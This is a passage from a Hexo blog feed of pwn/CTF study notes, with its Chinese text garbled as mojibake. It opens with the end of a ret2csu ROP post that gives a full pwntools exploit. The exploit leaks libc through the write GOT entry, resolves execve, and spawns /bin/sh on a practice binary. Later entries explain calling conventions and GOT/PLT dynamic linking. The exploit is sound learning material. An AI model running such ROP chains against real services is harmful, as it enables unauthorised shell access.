class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">bin_sh_str</span> = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br><span class="hljs-variable">bss_addr</span> = <span class="hljs-number">0</span><span class="hljs-variable">x601040</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">read_got</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">16</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br><span class="hljs-variable">sh.send</span>(<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">execve_addr</span>) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>read(0,bss_base,16) çš„å«ä¹‰ä¸ºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–æœ€å¤š 16 ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå¹¶å°†æ•°æ®å­˜å‚¨åˆ°ä½äº <code>bss_base</code> åœ°å€å¤„çš„ç¼“å†²åŒºä¸­ã€‚</p></blockquote><p>æœ€åè°ƒç”¨æ‰§è¡Œ <code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span> + <span class="hljs-number">8</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><p>æ€»çš„expä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>level5 = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = level5.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = level5.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = level5.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>bss_base = level5.bss()<br>csu_front_addr = <span class="hljs-number">0x400600</span><br>csu_end_addr = <span class="hljs-number">0x40061A</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>)<br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(<br>        r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="hljs-comment">## write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;execve_addr &#x27;</span> + <span class="hljs-built_in">hex</span>(execve_addr))<br><br><span class="hljs-comment">## read(0,bss_base,16)</span><br><span class="hljs-comment">## read execve_addr and /bin/sh\x00</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, read_got, <span class="hljs-number">16</span>, bss_base, <span class="hljs-number">0</span>, main_addr)<br>sh.send(p64(execve_addr) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## execve(bss_base+8,0,0)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, bss_base, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss_base + <span class="hljs-number">8</span>, main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p>å¾ˆèœèœçš„ROPï¼ŒæŠŠç¬”è®°æ”¶æ‹¾æ”¶æ‹¾å‘ä¸€ä¸‹ã€‚</p><p>æœ¬æ¥æƒ³è¯´æ ˆä¸Šå…¨éƒ¨ä¸œè¥¿éƒ½æå®Œå†å‘ï¼Œä½†æœ€è¿‘githubä¸Šçš„ç»¿ç‚¹ç‚¹éƒ½å°‘äº†å°±æå‰å‘ä¸€éƒ¨åˆ†å–½ğŸ˜¢</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‡½æ•°è°ƒç”¨çº¦å®š</title>
    <link href="/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>å‡½æ•°å‚æ•°æ€ä¹ˆä¼ é€’å’Œç”±è°æ¸…é™¤å †æ ˆ</p><span id="more"></span><p>ç‚’å†·é¥­ï¼Œéƒ½å¿«è¦å¿˜è®°è‡ªå·±æœ‰ä¸€ä¸ªåšå®¢äº† (x</p><h1 id="ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨çº¦å®š"></a>ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨çº¦å®š</h1><p>åœ¨å‡½æ•°è¢«è°ƒç”¨çš„è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨éƒ½è¿›è¡Œäº†ä»¥ä¸‹çš„å·¥ä½œï¼š</p><ol><li><p>æŠŠè°ƒç”¨è€…çš„åœ°å€å‹å…¥æ ˆ</p></li><li><p>æŠŠå‡½æ•°çš„å‚æ•°å‹å…¥æ ˆæˆ–è€…å­˜å‚¨åˆ°å¯„å­˜å™¨å½“ä¸­</p></li><li><p>è°ƒè½¬åˆ°è¢«å¼•ç”¨å‡½æ•°</p></li><li><p>æŠŠå‡½æ•°ä½¿ç”¨çš„å¯„å­˜å™¨å‹å…¥æ ˆ</p></li><li><p>æ‰§è¡Œå‡½æ•°</p></li><li><p>å¤„ç†å‡½æ•°è¿”å›å€¼</p></li><li><p>å°†ç¬¬ä¸‰æ­¥ä¸­å‹æ ˆçš„å¯„å­˜å™¨æ¢å¤åˆ°åŸå§‹å€¼</p></li><li><p>æ¸…ç©ºç¬¬ä¸€éƒ¨ä¸­çš„å‹æ ˆå‚æ•°å’Œå¤„ç†è¿”å›åœ°å€</p></li><li><p>è¿”å›åˆ°è°ƒç”¨è€…è°ƒç”¨æ—¶çš„åœ°å€ï¼ˆå³æ­¥éª¤ä¸€æ—¶è®°å½•çš„åœ°å€ï¼‰</p></li></ol><p>å‡½æ•°è°ƒç”¨çº¦å®šï¼Œå°±æ˜¯å¯¹å‡½æ•°è°ƒç”¨çš„ä¸€ä¸ªçº¦æŸå’Œè§„å®š(è§„èŒƒ)ï¼Œæè¿°äº†å‡½æ•°å‚æ•°æ˜¯æ€ä¹ˆä¼ é€’å’Œç”±è°æ¸…é™¤å †æ ˆçš„ã€‚ï¼ˆå †æ ˆå¹³è¡¡ï¼Ÿï¼‰</p><blockquote><p>x64çš„å‰å››ä¸ªå‚æ•°ä½¿ç”¨rcxï¼Œrdxï¼Œr8ï¼Œr9ä¼ é€’ï¼Œä¹‹åçš„å‚æ•°é€šè¿‡æ ˆæ¥ä¼ é€’</p></blockquote><p>å®ƒå†³å®šä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢ï¼š</p><ul><li>å‡½æ•°å‚æ•°ä¼ é€’çš„æ–¹å¼ï¼ˆæ˜¯å¦é‡‡ç”¨å¯„å­˜å™¨ä¼ é€’å‡½æ•°ï¼Œé‡‡ç”¨é‚£ä¸ªå¯„å­˜å™¨è°ƒç”¨å‡½æ•°ï¼Œå‚æ•°å‹æ ˆé¡ºåºç­‰ï¼‰</li><li>å‡½æ•°è°ƒç”¨ç»“æŸåçš„æ ˆæŒ‡é’ˆç”±è°æ¢å¤ï¼ˆè¢«è°ƒç”¨è€…æ¢å¤æˆ–æ˜¯è¢«è°ƒç”¨çš„å‡½æ•°æ¢å¤ï¼‰</li><li>å‡½æ•°ä¿®é¥°åçš„äº§ç”Ÿæ–¹æ³•</li></ul><p>æˆ‘ä»¬æ„é€ ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œä¼šè§„å®šè¿”å›ç±»å‹å’Œå‡½æ•°åï¼ˆå‚æ•°åˆ—è¡¨ï¼‰ï¼Œå¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">funcA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">funcB</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>; <br></code></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å¦å¤–ä¸€éƒ¨åˆ†ï¼Œå°±æ˜¯å‡½æ•°çš„è°ƒç”¨çº¦å®šï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆï¼Œä¹Ÿå¯ä»¥æœ‰æˆ‘ä»¬æ¥æ‰‹åŠ¨ç¼–å†™è§„å®šï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">funA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">funcB</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><h4 id="å¸¸è§çš„è°ƒç”¨çº¦å®š"><a href="#å¸¸è§çš„è°ƒç”¨çº¦å®š" class="headerlink" title="å¸¸è§çš„è°ƒç”¨çº¦å®š"></a>å¸¸è§çš„è°ƒç”¨çº¦å®š</h4><ul><li>cï¼š__cdecl ã€__stdcallã€__fastcallã€nakedã€__pascall</li><li>c++ï¼š__cdecl ã€__stdcallã€__fastcallã€nakedã€__pascallã€__thiscall</li></ul><h4 id="è°ƒç”¨çº¦å®šçš„ä½¿ç”¨"><a href="#è°ƒç”¨çº¦å®šçš„ä½¿ç”¨" class="headerlink" title="è°ƒç”¨çº¦å®šçš„ä½¿ç”¨"></a>è°ƒç”¨çº¦å®šçš„ä½¿ç”¨</h4><p>è°ƒç”¨çº¦å®šä¹¦å†™åœ¨å‡½æ•°çš„å‰é¢ï¼Œç›¸å½“äºå‡½æ•°ç±»å‹çš„ä¸€éƒ¨åˆ†ã€‚è¦æ±‚å‡½æ•°çš„å£°æ˜å’Œå®šä¹‰è¦æœ‰ç›¸åŒçš„è°ƒç”¨çº¦å®šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;   <span class="hljs-comment">//é»˜è®¤æ˜¯__cdecl</span><br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å°±ä¼šæç¤ºå‡ºé”™ï¼Œå› ä¸ºå£°æ˜å’Œå®šä¹‰çš„è°ƒç”¨çº¦å®šä¸åŒã€‚æ­£ç¡®åº”è¯¥æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;<br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¸åŒè°ƒç”¨ä¸‹çš„è§„åˆ™"><a href="#ä¸åŒè°ƒç”¨ä¸‹çš„è§„åˆ™" class="headerlink" title="ä¸åŒè°ƒç”¨ä¸‹çš„è§„åˆ™"></a>ä¸åŒè°ƒç”¨ä¸‹çš„è§„åˆ™</h1><p>é¦–å…ˆæˆ‘ä»¬å®šä¹‰ä¸¤ä¸ªæ¦‚å¿µï¼Œå³â€œè¢«è°ƒç”¨è€…â€å’Œâ€œè°ƒç”¨è€…â€ã€‚å¦‚ä¸‹Add()å‡½æ•°å°±æ˜¯â€œè¢«è°ƒç”¨è€…â€ï¼ŒShoowResult()å‡½æ•°å°±æ˜¯â€œè°ƒç”¨è€…â€ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a>__cdecl</h2><p>__cdeclæ˜¯C Declarationçš„ç¼©å†™ï¼Œè¡¨ç¤ºC\C++é»˜è®¤çš„å‡½æ•°è°ƒç”¨çº¦å®š</p><h4 id="è°ƒç”¨æ–¹å¼"><a href="#è°ƒç”¨æ–¹å¼" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h4><ul><li>é‡‡ç”¨æ ˆä¼ é€’å‚æ•°ï¼Œå‚æ•°<strong>ä»å³å‘å·¦</strong>ä¾æ¬¡å…¥æ ˆ</li><li>ç”±è°ƒç”¨è€…æ¢å¤æ ˆé¡¶æŒ‡é’ˆ</li><li>ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶ä¼šåœ¨å‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ç”Ÿæˆä¿®é¥°åï¼Œæ ¼å¼ä¸º_functionã€‚å¦‚Add()çš„ä¿®é¥°åæ˜¯_Add()</li></ul><blockquote><p>æ³¨æ„ï¼šè°ƒç”¨å‚æ•°ä¸ªæ•°å¯å˜çš„å‡½æ•°åªèƒ½é‡‡ç”¨è¿™ç§æ–¹å¼</p></blockquote><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h2><p>__stdcallæ˜¯Standard Callçš„ç¼©å†™ï¼Œæ˜¯C++çš„æ ‡å‡†è°ƒç”¨æ–¹å¼ã€‚</p><h4 id="è°ƒç”¨æ–¹å¼-1"><a href="#è°ƒç”¨æ–¹å¼-1" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h4><ul><li>é‡‡ç”¨æ ˆä¼ é€’å‚æ•°ï¼Œå‚æ•°<strong>ä»å³å‘å·¦</strong>ä¾æ¬¡å…¥æ ˆ</li><li>ç”±è¢«è°ƒç”¨è€…è´Ÿè´£æ¢å¤æ ˆé¡¶æŒ‡é’ˆ</li><li>åœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œåé¢åŠ ä¸€ä¸ª@ç¬¦å·å’Œå…¶å‚æ•°çš„å­—èŠ‚æ•°ï¼Œæ ¼å¼ä¸º_function@numberã€‚å¦‚å‡½æ•°Addçš„ä¿®é¥°åæ˜¯_Add@8</li></ul><p>__stdcallä¸__cdeclæœ€ä¸»è¦çš„åŒºåˆ«æ˜¯ç¬¬2æ¡è§„å®šï¼šç”±â€œè¢«è°ƒç”¨è€…â€æ¸…ç©ºå®é™…ä¸Šå°±æ˜¯æŠŠå¯¹åº”å‚æ•°æ•°ç›®çš„æ•°æ®ä»æ ˆä¸­å¼¹å‡ºï¼Œè¿™æ ·çš„ç¼ºç‚¹å°±æ˜¯å®ƒä¸èƒ½ä½¿ç”¨äºé‚£äº›ä¸ç¡®å®šæ•°ç›®å‚æ•°çš„å‡½æ•°ã€‚</p><p>å¥½å¤„åœ¨äºåªéœ€è¦åœ¨å‡½æ•°å†…éƒ¨ç¼–è¯‘å‡ºæ¢å¤æ ˆé¡¶çš„ä»£ç ï¼Œè€Œè°ƒç”¨è€…æ¢å¤åˆ™éœ€è¦åœ¨è°ƒç”¨å‡ºç¼–è¯‘å‡ºæ¢å¤æ ˆé¡¶çš„ä»£ç ã€‚</p><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h2><p>__fastcallæ˜¯å¿«é€Ÿè°ƒç”¨ï¼Œå› ä¸ºæœ‰éƒ¨åˆ†å‚æ•°å¯ä»¥é€šè¿‡å¯„å­˜å™¨ç›´æ¥ä¼ é€’ï¼Œæ•ˆç‡æ¯”è¾ƒé«˜ã€‚</p><h4 id="è°ƒç”¨æ–¹å¼-2"><a href="#è°ƒç”¨æ–¹å¼-2" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h4><ul><li>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªï¼ˆ<strong>ä»å·¦å‘å³</strong>ï¼‰32å­—èŠ‚å‚æ•°ï¼ˆæˆ–è€…å°ºå¯¸æ›´å°çš„ï¼‰é€šè¿‡ecxå’Œedxä¼ é€’ï¼ˆå¯„å­˜å™¨ä¼ é€’ï¼‰ï¼Œå…¶ä»–å‚æ•°é€šè¿‡æ¡Ÿä¼ é€’ã€‚ä»ç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰å¼€å§‹<strong>ä»å³å‘å·¦</strong>çš„é¡ºåºå‹æ ˆ</li><li>ç”±è¢«è°ƒç”¨è€…æ¢å¤æ ˆé¡¶æŒ‡é’ˆ</li><li>åœ¨å‡½æ•°åå‰åŠ ä¸Š@ï¼Œåœ¨å‡½æ•°åååŠ @å’Œå‚æ•°å­—èŠ‚æ•°ï¼Œæ ¼å¼ä¸º@function@number</li></ul><h2 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h2><p>__thiscallæ˜¯å”¯ä¸€ä¸€ä¸ªä¸èƒ½æ˜ç¡®æŒ‡æ˜çš„å‡½æ•°ä¿®é¥°ï¼Œå› ä¸ºthiscallåªèƒ½ç”¨äºC++ç±»æˆå‘˜å‡½æ•°çš„è°ƒç”¨ï¼ŒåŒæ—¶thiscallä¹Ÿæ˜¯C++æˆå‘˜å‡½æ•°ç¼ºçœçš„è°ƒç”¨çº¦å®šã€‚ç”±äºæˆå‘˜å‡½æ•°è°ƒç”¨è¿˜æœ‰ä¸€ä¸ªthisæŒ‡é’ˆï¼Œå› æ­¤å¿…é¡»ç‰¹æ®Šå¤„ç†ã€‚</p><h4 id="è°ƒç”¨æ–¹å¼-3"><a href="#è°ƒç”¨æ–¹å¼-3" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h4><ul><li>é‡‡ç”¨æ ˆä¼ é€’å‚æ•°ï¼Œå‚æ•°<strong>è‡ªå³å‘å·¦</strong>å…¥æ ˆ</li><li>å¦‚æœå‚æ•°çš„ä¸ªæ•°ç¡®å®šï¼ŒthisæŒ‡é’ˆé€šè¿‡ecxä¼ é€’ç»™è¢«è°ƒç”¨è€…ï¼›å¦‚æœå‚æ•°ä¸ªæ•°ä¸ç¡®å®šï¼ŒthisæŒ‡é’ˆåœ¨æ‰€æœ‰å‚æ•°å‹æ ˆåè¢«å‹å…¥å †æ ˆ</li><li>å¯¹äºå‚æ•°ä¸ªæ•°ä¸ç¡®å®šçš„ç”±è°ƒç”¨è€…é—®æ¸…ç†å †æ ˆï¼Œå¦åˆ™ç”±è¢«è°ƒå‡½æ•°æ¸…ç†ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŠ¨æ€é“¾æ¥GOTä¸PLT</title>
    <link href="/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/"/>
    <url>/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/</url>
    
    <content type="html"><![CDATA[<p>ä¸»è¦æ˜¯åŠ¨æ€é“¾æ¥çš„ä¸€äº›å†…å®¹</p><span id="more"></span><p>æ–­æ–­ç»­ç»­ç£¨äº†ä¸€ä¸ªå‘¨ï¼Œæœ¬æ¥åªæ˜¯æƒ³å­¦ä¸€ä¸‹gotè¡¨åæ¥å‘ç°è¶ŠæŒ–è¶Šæ·±ä»€ä¹ˆéƒ½ä¸ä¼šï¼Œå¤§è‡´äº†è§£ä¸€ä¸‹ï¼Œæœ€åå†™å‡ºäº†è¿™æ ·ä¸€ä¸ªç½‘ç»œåƒåœ¾ï¼ˆx</p><h1 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h1><p><strong>é“¾æ¥å°±æ˜¯æŠŠç›®æ ‡æ–‡ä»¶ä¸ä¸€äº›åº“æ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚</strong></p><h3 id="ç¼–è¯‘è¿‡ç¨‹"><a href="#ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘è¿‡ç¨‹"></a>ç¼–è¯‘è¿‡ç¨‹</h3><p>è¦äº†è§£â€œé“¾æ¥â€çš„æ¦‚å¿µï¼Œé¦–å…ˆè¦äº†è§£Cè¯­è¨€ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ï¼š(1) é¢„å¤„ç†ï¼›(2) ç¼–è¯‘ï¼›(3) æ±‡ç¼–ï¼›(4) é“¾æ¥ï¼›</p><h5 id="01-é¢„å¤„ç†"><a href="#01-é¢„å¤„ç†" class="headerlink" title="01 é¢„å¤„ç†"></a>01 é¢„å¤„ç†</h5><p>ä½¿ç”¨é¢„å¤„ç†å™¨æŠŠæºæ–‡ä»¶<code>test.c</code>ç»è¿‡é¢„å¤„ç†ç”Ÿæˆ<code>test.i</code>æ–‡ä»¶ï¼Œé¢„å¤„ç†ç”¨äºå°†æ‰€æœ‰çš„<code>#include</code>å¤´æ–‡ä»¶ä»¥åŠå®å®šä¹‰æ›¿æ¢æˆå…¶çœŸæ­£çš„å†…å®¹ï¼Œå…¶ä¸­<code>test.i</code>æ˜¯æ–‡æœ¬æ–‡ä»¶ã€‚</p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªcè¯­è¨€çš„æºæ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&#x27;This is a test program!\n&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gccå¤„ç†å‘½ä»¤ä¸ºï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -E test.c -o test.i   